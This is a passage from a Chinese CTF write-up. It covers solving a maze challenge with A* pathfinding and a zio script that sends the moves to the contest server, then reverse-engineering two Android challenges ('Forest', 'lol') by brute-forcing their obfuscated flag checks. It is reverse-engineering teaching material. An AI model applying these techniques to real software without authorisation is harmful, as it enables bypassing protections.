&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;end
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;l
&nbsp;&nbsp;&nbsp;&nbsp;begin&nbsp;=&nbsp;start
&nbsp;&nbsp;&nbsp;&nbsp;way&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;x,&nbsp;y&nbsp;in&nbsp;l[1:]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff&nbsp;=&nbsp;(end[0]&nbsp;-&nbsp;x,&nbsp;end[1]&nbsp;-&nbsp;y)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;=&nbsp;(x,&nbsp;y)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;diff
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;way.append(step_map[diff])
&nbsp;&nbsp;&nbsp;&nbsp;way&nbsp;=&nbsp;way[::-1]
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&quot;.join(way)
def&nbsp;find_path(s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y,&nbsp;w,&nbsp;h):
&nbsp;&nbsp;&nbsp;&nbsp;#s_x,&nbsp;s_y&nbsp;=&nbsp;get_start_XY()
&nbsp;&nbsp;&nbsp;&nbsp;#e_x,&nbsp;e_y&nbsp;=&nbsp;get_end_XY()
&nbsp;&nbsp;&nbsp;&nbsp;a_star&nbsp;=&nbsp;A_Star(s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y,&nbsp;w,&nbsp;h)
&nbsp;&nbsp;&nbsp;&nbsp;a_star.find_path()
&nbsp;&nbsp;&nbsp;&nbsp;searched&nbsp;=&nbsp;a_star.get_searched()
&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;a_star.path
&nbsp;&nbsp;&nbsp;&nbsp;#标记已搜索区域
&nbsp;&nbsp;&nbsp;&nbsp;mark_searched(searched)
&nbsp;&nbsp;&nbsp;&nbsp;#标记路径
&nbsp;&nbsp;&nbsp;&nbsp;mark_path(path)
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;path&nbsp;length&nbsp;is&nbsp;%d&quot;%(len(path))
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;searched&nbsp;squares&nbsp;count&nbsp;is&nbsp;%d&quot;%(len(searched))
&nbsp;&nbsp;&nbsp;&nbsp;#标记开始、结束点
&nbsp;&nbsp;&nbsp;&nbsp;mark_start_end(s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;getway(path,&nbsp;(s_x,&nbsp;s_y),&nbsp;(e_x,&nbsp;e_y))
def&nbsp;build_my_map():
&nbsp;&nbsp;&nbsp;&nbsp;file_r&nbsp;=&nbsp;open(&quot;path.info&quot;,&nbsp;&#39;r&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;file_r.read()
&nbsp;&nbsp;&nbsp;&nbsp;file_r.close()
&nbsp;&nbsp;&nbsp;&nbsp;map_info&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;map_info.append([&#39;#&#39;&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(499)])
&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(497):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item&nbsp;=&nbsp;[&#39;#&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;xrange(497):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#item.append(ord(data[index]))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;ord(data[index])&nbsp;&amp;&nbsp;0xf&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item.append(&#39;#&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item.append(&#39;.&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item.append(&#39;#&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map_info.append(item)
&nbsp;&nbsp;&nbsp;&nbsp;map_info.append([&#39;#&#39;&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(499)])
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;little_map&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;map_info[:30+2]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;little_map.append(item[:25+2])
&nbsp;&nbsp;&nbsp;&nbsp;map_info&nbsp;=&nbsp;little_map
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;len(map_info)
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;test_map
&nbsp;&nbsp;&nbsp;&nbsp;test_map&nbsp;=&nbsp;map_info
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;#把字符串转成列表
&nbsp;&nbsp;&nbsp;&nbsp;build_my_map()
&nbsp;&nbsp;&nbsp;&nbsp;s_x,&nbsp;s_y&nbsp;=&nbsp;1,1
&nbsp;&nbsp;&nbsp;&nbsp;e_x,&nbsp;e_y&nbsp;=&nbsp;497,497
&nbsp;&nbsp;&nbsp;&nbsp;w,&nbsp;h&nbsp;=&nbsp;e_x&nbsp;+&nbsp;2,&nbsp;e_y&nbsp;+&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;find_path(s_x,&nbsp;s_y,&nbsp;e_x,&nbsp;e_y,&nbsp;w,&nbsp;h)
&nbsp;&nbsp;&nbsp;&nbsp;#print_test_map()</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">得到路径如下:</span></p><p style="text-indent: 28px; text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p1.qhimg.com/t0192547ffc7f2c32b2.png" src="http://p6.qhimg.com/t010f387b036de024d8.png" title="t0192547ffc7f2c32b2.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">通过抓包发现,游戏将运行的路径按aswd发送给了服务器,最后到达终点时发送一个flag。如果作弊到达的,会发回no cheat。</span></p><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">path&nbsp;=&nbsp;&quot;&quot;&quot;
ddddddddddddssddddssssssssassdddddddddsddwwwddddwwwwwwwwwddsssssssdddssasssssssaawaaaassaassssddddssssdssaassddsssassssaawaaawwdwwwaaaawwaasssssddsssssssssddwww
dddssassssassdssssssaaassdddssddddssddddssdssaaaaassssssssssssaasaawwwwwaaassssssaaaaasaaaasaassssaaaawwaaaaaaassddddssssdddsddsssddddssdssaassdssssssddssddddssssdddssssdsssddwwwdwwawwwddsddddwwddwwddddwwdddwwawwaaawwdddwwdddssssdddssdddddwwaawwdddwddsssssddssssssaaaawwaaassdssddsddwddddssssssssssaaawwwwwawaaaaawaaasaassaassaaaawwaaaassssssssddddddwwwddsssddssssssddsssssssdddddsdddwwddddddddddsssdddwwwdddwwddwwwwddwddddddsssddddwwwwddwwwwwwddddssddssdssddssasssssddwwddsdssassaasssddwddddssssssddddwwwwwddsssssddddssddsddwwwawwwawaaawwdwwdddddddssssdddwwdddwwaaawwwwawwdddddwwddwwddwddssssssaaaasaaassdddddddddddssddsddwddddddddwddddwwddsssddddsssaaaasassssdsddwwwdddddssssdsddwwwdddsssdsssaassssaaassdddssddddddssssddddssssddsddddsddssssssssaaaaaawaasssddssdssssdsdddsdsssddddddwdwwaaaawwwwdddddwwddwwddwddsssaasssddwddwdwwwwwwwdwwwddsddddwdwwwwwaawwwwwwdddsssddwwwdddddwwwwdwwwddsssssddsssddwddddwwddddwwwwdddssssdddwwwddsssdddddssssssasaawwwwaasssaaassddssaaaassssaaaaassssdsssdsssssasssaaawaaaaassdddssddsssaawaaaaaaaassssddssddddddwddsssdssaaaawwaaasaaaasssdddddddsssaaasssddssdssaaawwaaaaassdddssssdssssdddddwwwwwddsssssssaaassdddddwwdwwwwdddddssddddddwwdddwwwwdddddwwwwaawwwwddwwdddsddddddddwdddwwdddssassassasssssddwwwddwwdddssssaassdddddddsddwdwwwwdwwwwddddwddsssssaassassdddddsssssssddwdddddwwwwdwddssdddddwdddssddddddddsddssddwwwwddsdddssasssssddwwddssddwwddwwwwddssssssddwwwwwwwddwwdddssassssssdddsdddsddddddddssssdssssaaaaassssssssassdddssssdssssdssssddsssssddwwddssddwddwddsddddsssssaawwaasaaaasaaaasssdddssssddddwwwwdddssssdssssdddwddsdssasaaaasaaaaaaassdddddddddsddwddwddddddsdddddddddwwaaaawwaaaaaaaawwdddwwwddssddwwwwddsdssssdddwwddwdwwwwwaawwaaaawwdddddddddddwwwddsssssaaassdsddddsddddddddddsddwwwaaaaaaawwdddddwddsddssssssddddwwwwwwddwwdddddddssassssdsssdsssssassdssssssassdddssdddssaaaaaaawaasssssssddddddwddsssddddddwddsdssssdddsssddwwwdddssssddddddwwdwwwwddddsddddsssssddddssddssdssassssdssaaasssssssddsdddwwwwdddssssssssaaaaaaaawwaawwwwwwwwaawwwwwaassssaaaasaassssdddddwwdddssssssaaaassssdssassaasssaaaawwwaaassdssssddddsssddwwddsssddddddssdssaaawaaaawaaaaaasaawwaasssssssdsssdddddsddssdssdddssssaassssaassaasaaawaaassssdssddssaaaaaaaawwddwwaaaaasssssaawaaaaaaaasssssddwddddssssssaassssssdddsssdddsddssssssssssssdddsssdsddddwwddwwwddssddddwdddssassaaaasssaawaaaaaaaasssddwdddssasssddddsddddssddddsddssddwwwwwwaaaawwwwddddwwwddwddsssssssssassssdddddddddsssaawaaaaassssaaawaassssddddddddddsssssassdddssssssssssssaasssddddsssssaasssddwdddssassssddddsddddddsssssssaassaaaaaassaaaaaaawwwawaawwaaassdssssssddddddsddwddddsddwwddssdddds&quot;&quot;&quot;
path&nbsp;=&nbsp;path.replace(&quot;\n&quot;,&nbsp;&quot;&quot;)
from&nbsp;zio&nbsp;import&nbsp;*
target&nbsp;=&nbsp;(&#39;202.120.7.132&#39;,&nbsp;9999)
#target&nbsp;=&nbsp;&#39;./test&#39;
def&nbsp;exp(target):
&nbsp;&nbsp;&nbsp;&nbsp;#io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(REPR,&nbsp;&#39;red&#39;),&nbsp;print_write=COLORED(REPR,&nbsp;&#39;green&#39;))
&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(RAW,&nbsp;&#39;red&#39;),&nbsp;print_write=COLORED(RAW,&nbsp;&#39;green&#39;))
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;ch_t&nbsp;in&nbsp;path:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(ch_t)
&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(&#39;flag&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
exp(target)</pre><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">得到flag:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p5.qhimg.com/t01afff4ab042c9c471.png" src="http://p0.qhimg.com/t018156aee352752644.png" title="t01afff4ab042c9c471.png"/></p><p><br/></p><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;">Mobile</span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Forest (150)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">首先观察这个函数:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p3.qhimg.com/t01270664b5c8ae02c7.png" src="http://p4.qhimg.com/t01230d5de5fee5ce2e.png" title="t01270664b5c8ae02c7.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在判断相等的时候使用的长度实际上是nj和v1中较短的一个长度。而nj即为字符串” VFT}E7gy4yfE7tuG6{”。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">那么在:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p2.qhimg.com/t01e5d83a4beca17aa4.png" src="http://p7.qhimg.com/t01f110b08ef1ae9fd7.png" title="t01e5d83a4beca17aa4.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里对输入进行了cc,ca,cb三种不同变换方式后进行了拼接,其中ca和cc在变化后的长度是保持不变的。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里猜测如果输入的长度和”VFT}E7gy4yfE7tuG6{“长度相等的话。那么ca和cb两种加密方式实际上是没有任何用处的。cc的加密方式是逐位的,这里直接逐位爆破了,得到flag。</span></p><table cellpadding="0" cellspacing="0"><tbody><tr class="firstRow"><td style="border: 1px solid windowtext; padding: 0px 7px; word-break: break-all;" valign="top" width="553"><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&#39;bibi&#39;
&nbsp;&nbsp;&nbsp;target=&#39;VFT}E7gy4yfE7tuG6{&#39;
&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(target)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rr=&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\n&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(0xff):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;j&nbsp;&lt;97&nbsp;or&nbsp;j&gt;109:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;j&nbsp;&gt;=65&nbsp;and&nbsp;j&lt;=77:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j+13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;j&gt;=110&nbsp;and&nbsp;j&nbsp;&nbsp;&nbsp;&lt;=122:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j-13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;j&gt;=78&nbsp;and&nbsp;j&nbsp;&nbsp;&nbsp;&lt;=90:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j-13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;j&gt;=48&nbsp;and&nbsp;j&lt;=57:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j^7
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j^6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=j+13
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;target[i]==chr(temp):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;chr(j),</pre></td></tr></tbody></table><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">lol (250)</span></h3><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Java层逻辑比较简单,就是调用so里面的getflag代码进行判断,返回‘1’就成功,直接分析so文件,发现里面有2个可疑的函数check和en,其实根据参数很容易判断出来,getflag函数就是IDA里面的en函数,其实看代码可以发现,en函数里面的一部分代码就是check函数,而且把check函数抠出来,单独跑功能就是比较两个字符串是否相等,从而返回‘1’或者‘0’。所以重要的是en函数。</span></p><p style="text-align: left; text-indent: 28px;"><br/></p><p style="text-align: center;"><img alt="http://p9.qhimg.com/t01c96c67eaada298b2.png" src="http://p2.qhimg.com/t013461e1564206a1e5.png" title="t01c96c67eaada298b2.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">en函数的代码是经过控制流混淆的,乍一看特别乱,如下:</span></p><p style="text-align: left; text-indent: 28px;"><br/></p><p style="text-align: center;"><img alt="http://p6.qhimg.com/t0161d5d5fbe0c594e4.png" src="http://p2.qhimg.com/t016087b26bdf4c1595.png" title="t0161d5d5fbe0c594e4.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">但是由于找到了里面存在check函数代码,其实思路也简单,应该就是将输入字符串经过处理,然后check一下,由于里面的运算很少,逻辑是很简单的,所以先理清楚控制流逻辑,将算法还原。</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">为了找到控制流,我将代码抠出来,在每个重要的运算或者判断前面加上log标志,然后修改部分代码,让其成为正常的c程序, 如下:</span></p><p style="text-indent: 28px; text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t01e5c99c5bb0af820f.png" src="http://p0.qhimg.com/t012524c4dcf55ffba3.png" title="t01e5c99c5bb0af820f.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">说明:1和4都是运算逻辑,2和6都是判断逻辑</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">构造输入,看输出信息,如下:</span></p><p style="text-align: left; text-indent: 28px;"><br/></p><p style="text-align: center;"><img alt="http://p5.qhimg.com/t01227c3a29450dcb96.png" src="http://p3.qhimg.com/t0186c7bdc1a1e722a9.png" title="t01227c3a29450dcb96.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">可以看到流程,前面三个走了1,后面依次是2-6-1循环,由于有条指令不确定,但是其结果只能是0或者1,如下,所以两种都试下:</span></p><p style="text-align: left; text-indent: 28px;"><br/></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t016283e58c6239d25a.png" src="http://p5.qhimg.com/t01d282355b47604cad.png" title="t016283e58c6239d25a.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">结果就是将前面的1替换成4,据此就看看出流程了,</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">for&nbsp;i&nbsp;in&nbsp;range(24):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i&nbsp;&lt;&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;1&nbsp;或者4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断&nbsp;2和6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;1或者&nbsp;4</pre><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">完整的python代码如下:</span></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
sign&nbsp;=&nbsp;1
aNzRol68hviis8q&nbsp;=&nbsp;[ord(c)&nbsp;for&nbsp;c&nbsp;in&nbsp;&quot;NZ@rol68hViIs8qlX~7{6m&amp;t&quot;];
val_list&nbsp;=&nbsp;[]
v30&nbsp;=&nbsp;range(24)
for&nbsp;index&nbsp;in&nbsp;range(24):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;ch_t&nbsp;in&nbsp;range(256):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v30[index]&nbsp;=&nbsp;ch_t
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;index&nbsp;&lt;&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;sign&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;(v30[index]&nbsp;&amp;&nbsp;0x26&nbsp;|&nbsp;~v30[index]&nbsp;&amp;&nbsp;0xD9)&nbsp;^&nbsp;0xDE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;(v30[index]&nbsp;&amp;&nbsp;0xF6)&nbsp;|&nbsp;~v30[index]&nbsp;&amp;&nbsp;9;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;v30[index]&nbsp;&lt;&nbsp;ord(&#39;A&#39;)&nbsp;or&nbsp;v30[index]&nbsp;&gt;&nbsp;ord(&#39;Z&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;sign&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;(v30[index]&nbsp;&amp;&nbsp;0x26&nbsp;|&nbsp;~v30[index]&nbsp;&amp;&nbsp;0xD9)&nbsp;^&nbsp;0xDE;
